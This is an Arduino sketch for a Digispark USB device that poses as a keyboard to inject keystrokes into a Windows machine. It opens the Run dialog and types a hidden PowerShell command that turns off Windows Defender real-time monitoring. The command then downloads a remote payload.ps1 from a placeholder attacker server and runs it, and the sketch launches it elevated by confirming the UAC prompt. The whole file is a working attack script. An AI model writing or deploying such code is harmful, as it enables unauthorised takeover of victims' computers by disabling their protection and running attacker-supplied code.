// Open powershell as administrator, disable real-time protection and run ps1 payload fetched from the server.

#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT);

  digitalWrite(1, HIGH);

  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(404);
  DigiKeyboard.print("powershell -windowstyle hidden \"Set-MpPreference -DisableRealtimeMonitoring $true; Start-Sleep 0.666; IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/payload.ps1');\"");
  DigiKeyboard.delay(69);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(404);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(69);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  digitalWrite(1, LOW); 
}

void loop() {
}
